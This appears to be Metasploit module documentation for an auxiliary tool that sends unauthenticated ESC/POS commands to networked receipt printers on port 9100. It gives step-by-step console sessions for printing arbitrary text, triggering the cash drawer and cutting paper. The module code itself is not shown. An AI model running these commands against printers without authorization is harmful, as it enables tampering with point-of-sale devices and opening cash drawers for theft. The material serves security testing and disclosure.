## Vulnerable Application

This module targets networked ESC/POS compatible printers that listen for raw commands on TCP port 9100.
The vulnerability is a lack of authentication and access control on this port, allowing anyone with
network access to send unauthenticated ESC/POS commands. The module exploits this by sending crafted
command sequences to inject custom print jobs, trigger the cash drawer, or manipulate the paper feed,
effectively taking control of the printer's physical functions.


- **Printer Model:** Any Epson-compatible printer exposing the ESC/POS command set
on TCP port 9100.

- **Protocol:** ESC/POS over TCP.

- **CVE:** Submitted for Epson-compatible thermal printers; awaiting assignment.



## Verification Steps



1. **Load the module:**
    use auxiliary/admin/printer/escpos_tcp_command_injector

2. **Set required options:**
    set RHOST <printer_ip>

3. **Choose an action:**
    Set the `ACTION` option to specify the desired behavior.
    - `PRINT`: Prints a custom text message.
    - `DRAWER`: Triggers the attached cash drawer.
    - `CUT`: Feeds lines and cuts the paper.

4. **Execute the module:**
    run

---


## Options

### MESSAGE

This option specifies the text to be sent to the printer.

* **Description:** The string of text you want the printer to output. It is only required when `ACTION` is set to `PRINT`.
* **Default:** "PWNED"
* **Example:** `set MESSAGE "Printing this now"`

### DRAWER_COUNT

This option specifies how many times to trigger the cash drawer signal.

* **Description:** The number of times to fire the open drawer command. Only used when `ACTION` is set to `DRAWER`.
* **Default:** `1`
* **Example:** `set DRAWER_COUNT 3`

### FEED_LINES

This option specifies how much paper to feed before cutting.

* **Description:** The number of lines to feed before executing the paper cut. Only used when `ACTION` is set to `CUT`.
* **Default:** `5`
* **Example:** `set FEED_LINES 10`



## Scenarios

### Example 1: Printing a Simple Message

This example shows how to use the module to send a simple text message to a network-connected ESC/POS printer.

msf6 > use auxiliary/admin/printer/escpos_tcp_command_injector
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set RHOSTS 192.168.1.200
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set ACTION PRINT
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set MESSAGE "Hello World"
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > run

[*] Connected to printer at 192.168.1.200
[+] Printed message: 'Hello World'

### Example 2: Triggering the Cash Drawer

This scenario demonstrates the use of the `DRAWER` action to send the specific
ESC/POS command to open a cash drawer connected to the printer.

msf6 > use auxiliary/admin/printer/escpos_tcp_command_injector
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set RHOSTS 192.168.1.200
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set ACTION DRAWER
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > run

[*] Connected to printer at 192.168.1.200
[*] Triggering cash drawer 1 times...
[+] Triggered cash drawer.

### Example 3: Cutting Paper

This example shows how to use the `CUT` action to feed paper and perform a full cut.

msf6 > use auxiliary/admin/printer/escpos_tcp_command_injector
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set RHOSTS 192.168.1.200
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set ACTION CUT
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > set FEED_LINES 10
msf6 auxiliary(admin/printer/escpos_tcp_command_injector) > run

[*] Connected to printer at 192.168.1.200
[*] Feeding 10 lines and cutting paper...
[+] Paper fed and cut.


This module has been tested against a physical Epson-compatible receipt printer and
verified to print custom messages and trigger the cash drawer.
For additional device compatibility, refer to the ESC/POS protocol documentation.
